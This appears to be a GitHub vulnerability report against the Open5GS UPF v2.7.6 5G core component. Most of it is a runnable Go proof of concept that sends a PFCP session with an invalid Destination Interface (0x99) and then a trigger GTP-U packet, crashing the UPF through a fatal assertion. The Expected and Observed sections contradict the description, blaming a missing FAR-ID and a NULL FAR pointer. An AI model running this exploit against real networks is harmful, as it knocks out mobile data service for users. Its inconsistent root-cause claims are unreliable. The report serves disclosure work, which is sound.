### Expected behaviour

UPF should reject Session Establishment that lacks FAR-ID (mandatory IE per TS 29.244), or fail gracefully before any GTP-U packet is processed.

### Observed Behaviour

UPF accepts the session but crashes on the first matching GTP-U packet because pdr->far is NULL.

### eNodeB/gNodeB

No

### UE Models and versions

No

### Open5GS Release, Revision, or Tag

v2.7.6

### Steps to reproduce

### Description
Open5GS UPF v2.7.6 accepts a PFCP Session Establishment Request that installs a Forwarding Action Rule (FAR) where the Forwarding Parameters -> Destination Interface is set to an unsupported or unhandled value (e.g., 0x99 ).However, the UPF GTP-U receive path (src/upf/gtp-path.c, specifically in _gtpv1_u_recv_cb) does not implement handling for this Destination Interface value. AAs a result, once any subsequent GTP-U packet matches the installed PDR and triggers the FAR forwarding path, the UPF reaches an unimplemented branch (default case in the switch statement) and terminates the process via a fatal assertion (ogs_fatal) and abort. This vulnerability allows a remote attacker (acting as a compromised SMF or via N4 interface) to cause a User-Plane Denial of Service (DoS) by sending a single malicious PFCP packet followed by a data plane trigger packet.

### Steps to reproduce
1. Start a new go project inside a new folder: `go mod init poc`
2. Create a `main.go` and paste the code below:
```
package main

import (
	"encoding/binary"
	"flag"
	"fmt"
	"log"
	"net"
	"time"

	"github.com/wmnsk/go-pfcp/ie"
	"github.com/wmnsk/go-pfcp/message"
)

func establishAssociation(conn *net.UDPConn, nodeID string) error {
	log.Println("[*] Phase 1: Establishing PFCP association...")

	req := message.NewAssociationSetupRequest(
		1,
		ie.NewNodeID("", "", nodeID),
		ie.NewRecoveryTimeStamp(time.Now()),
	)

	b := make([]byte, req.MarshalLen())
	if err := req.MarshalTo(b); err != nil {
		return fmt.Errorf("marshal failed: %v", err)
	}
	if _, err := conn.Write(b); err != nil {
		return fmt.Errorf("send failed: %v", err)
	}

	buf := make([]byte, 1500)
	_ = conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	if n, err := conn.Read(buf); err == nil {
		log.Printf("[+] Association established (%d bytes)", n)
	} else {
		log.Printf("[!] Association response not received (continuing): %v", err)
	}
	_ = conn.SetReadDeadline(time.Time{})
	return nil
}

// Reply to a Heartbeat Request if one arrives.
func handleHeartbeat(conn *net.UDPConn) {
	buf := make([]byte, 1500)
	_ = conn.SetReadDeadline(time.Now().Add(300 * time.Millisecond))
	n, err := conn.Read(buf)
	if err != nil || n < 8 {
		_ = conn.SetReadDeadline(time.Time{})
		return
	}
	if buf[1] == message.MsgTypeHeartbeatRequest {
		seq := binary.BigEndian.Uint32(buf[4:8])
		resp := message.NewHeartbeatResponse(seq, nil)
		if b, err := resp.Marshal(); err == nil {
			conn.Write(b)
		}
	}
	_ = conn.SetReadDeadline(time.Time{})
}

func craftSession(nodeID, fseidIP, ueIP, upfN3IP string, teid uint32) []byte {
	// Invalid DestinationInterface (0x99) to trigger fatal.
	badDstIf := ie.New(ie.DestinationInterface, []byte{0x99})

	// Outer Header Creation to keep FAR plausible (GTP-U/IPv4).
	ohc := ie.NewOuterHeaderCreation(0x0100, 0x12345678, "", fseidIP, 2152, 0, 0)

	createFAR := ie.NewCreateFAR(
		ie.NewFARID(1),
		ie.NewApplyAction(0x02), // FORW
		ie.NewForwardingParameters(
			badDstIf,
			ohc,
		),
	)

	createPDR := ie.NewCreatePDR(
		ie.NewPDRID(1),
		ie.NewPrecedence(100),
		ie.NewPDI(
			ie.NewSourceInterface(ie.SrcInterfaceAccess),          // Uplink path via N3 GTP-U
			ie.NewFTEID(0x01, teid, net.ParseIP(upfN3IP), nil, 0), // IPv4 flag set
			ie.NewUEIPAddress(0x02, ueIP, "", 0, 0),
		),
		ie.NewFARID(1),
	)

	ies := []*ie.IE{
		ie.NewNodeID("", "", nodeID),
		ie.NewFSEID(0x1, net.ParseIP(fseidIP), nil),
		ie.NewPDNType(ie.PDNTypeIPv4),
		createPDR,
		createFAR,
	}

	req := message.NewSessionEstablishmentRequest(
		0, 0,
		0x1234567890abcdef,
		2,
		0,
		ies...,
	)

	buf := make([]byte, req.MarshalLen())
	_ = req.MarshalTo(buf)
	return buf
}

// Send a GTP-U packet on N3 to hit the PDR/FAR.
func sendTriggerGTPU(n3 string, teid uint32, ueIP, innerDst string, innerPort uint16) {
	raddr, err := net.ResolveUDPAddr("udp", n3)
	if err != nil {
		log.Printf("[!] resolve N3 addr %s: %v", n3, err)
		return
	}
	conn, err := net.DialUDP("udp", nil, raddr)
	if err != nil {
		log.Printf("[!] dial N3 %s: %v", n3, err)
		return
	}
	defer conn.Close()

	srcIP := net.ParseIP(ueIP).To4()
	dstIP := net.ParseIP(innerDst).To4()
	if srcIP == nil || dstIP == nil {
		log.Printf("[!] invalid IPv4 for UE or inner dst")
		return
	}

	payload := []byte("trigger-far-dst-if")
	inner := buildInnerIPv4UDP(srcIP, dstIP, 20000, innerPort, payload)
	gtp := buildGTPU(teid, inner)
	if _, err := conn.Write(gtp); err != nil {
		log.Printf("[!] send gtp-u: %v", err)
	} else {
		log.Printf("[+] Sent GTP-U to %s TEID=0x%x inner %s -> %s:%d", n3, teid, srcIP, dstIP, innerPort)
	}
}

func main() {
	target := flag.String("target", "", "UPF PFCP IP")
	port := flag.Int("port", 8805, "PFCP port")
	nodeID := flag.String("node-id", "smf.open5gs.org", "NodeID/FQDN presented to UPF")
	fseidIP := flag.String("fseid-ip", "10.45.0.1", "CP F-SEID IPv4 address")
	ueIP := flag.String("ue-ip", "10.45.0.2", "UE IPv4 address for PDR match")
	upfN3 := flag.String("n3", "", "UPF N3 address host:port for trigger GTP-U (default target:2152)")
	teid := flag.Uint("teid", 0xABCDEF01, "TEID to install on PDR (and use for trigger GTP-U)")
	innerDst := flag.String("inner-dst", "8.8.8.8", "Inner IPv4 destination for trigger GTP-U")
	innerPort := flag.Uint("inner-port", 2152, "Inner UDP port for trigger GTP-U payload")
	sendData := flag.Bool("send-data", true, "Send a GTP-U packet to trigger FAR processing")
	flag.Parse()

	if *target == "" {
		log.Fatal("Error: --target required")
	}

	addr := &net.UDPAddr{IP: net.ParseIP(*target), Port: *port}
	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		log.Fatalf("Dial failed: %v", err)
	}
	defer conn.Close()

	log.Printf("[*] Target: %s:%d", *target, *port)

	if err := establishAssociation(conn, *nodeID); err != nil {
		log.Fatalf("Association failed: %v", err)
	}

	handleHeartbeat(conn)

	log.Println("[*] Sending Session Establishment with invalid DestinationInterface (0x99)...")
	n3Host := upfN3IP(*target, *upfN3)
	msg := craftSession(*nodeID, *fseidIP, *ueIP, n3Host, uint32(*teid))

	if _, err := conn.Write(msg); err != nil {
		log.Fatalf("Send failed: %v", err)
	}

	log.Println("[+] PoC sent.")
	if *sendData {
		n3addr := *upfN3
		if n3addr == "" {
			n3addr = net.JoinHostPort(*target, "2152")
		}
		sendTriggerGTPU(n3addr, uint32(*teid), *ueIP, *innerDst, uint16(*innerPort))
	} else {
		log.Println("[!] Remember to send matching traffic (GTP-U with TEID) to trigger FAR processing.")
	}
	time.Sleep(2 * time.Second)
}

// helper: if explicit N3 provided use it, else default to target:port
func upfN3IP(target, override string) string {
	if override != "" {
		host, _, err := net.SplitHostPort(override)
		if err == nil {
			return host
		}
		return override
	}
	return target
}

// checksum helpers
func csum(data []byte) uint16 {
	sum := uint32(0)
	for len(data) > 1 {
		sum += uint32(binary.BigEndian.Uint16(data))
		data = data[2:]
	}
	if len(data) > 0 {
		sum += uint32(data[0]) << 8
	}
	for (sum >> 16) > 0 {
		sum = (sum & 0xFFFF) + (sum >> 16)
	}
	return ^uint16(sum)
}

func buildInnerIPv4UDP(srcIP, dstIP net.IP, srcPort, dstPort uint16, payload []byte) []byte {
	udpLen := 8 + len(payload)
	ipLen := 20 + udpLen

	ip := make([]byte, 20)
	ip[0] = 0x45
	binary.BigEndian.PutUint16(ip[2:], uint16(ipLen))
	binary.BigEndian.PutUint16(ip[4:], uint16(time.Now().UnixNano()))
	ip[6] = 0x40
	ip[8] = 64
	ip[9] = 17
	copy(ip[12:], srcIP.To4())
	copy(ip[16:], dstIP.To4())
	binary.BigEndian.PutUint16(ip[10:], csum(ip))

	udp := make([]byte, 8)
	binary.BigEndian.PutUint16(udp[0:], srcPort)
	binary.BigEndian.PutUint16(udp[2:], dstPort)
	binary.BigEndian.PutUint16(udp[4:], uint16(udpLen))

	psh := make([]byte, 12)
	copy(psh[0:], srcIP.To4())
	copy(psh[4:], dstIP.To4())
	psh[9] = 17
	binary.BigEndian.PutUint16(psh[10:], uint16(udpLen))

	udpChkData := append(append(psh, udp...), payload...)
	binary.BigEndian.PutUint16(udp[6:], csum(udpChkData))

	pkt := make([]byte, 0, ipLen)
	pkt = append(pkt, ip...)
	pkt = append(pkt, udp...)
	pkt = append(pkt, payload...)
	return pkt
}

func buildGTPU(teid uint32, inner []byte) []byte {
	gtp := make([]byte, 8+len(inner))
	gtp[0] = 0x30
	gtp[1] = 0xFF // T-PDU
	binary.BigEndian.PutUint16(gtp[2:], uint16(len(inner)))
	binary.BigEndian.PutUint32(gtp[4:], teid)
	copy(gtp[8:], inner)
	return gtp
}
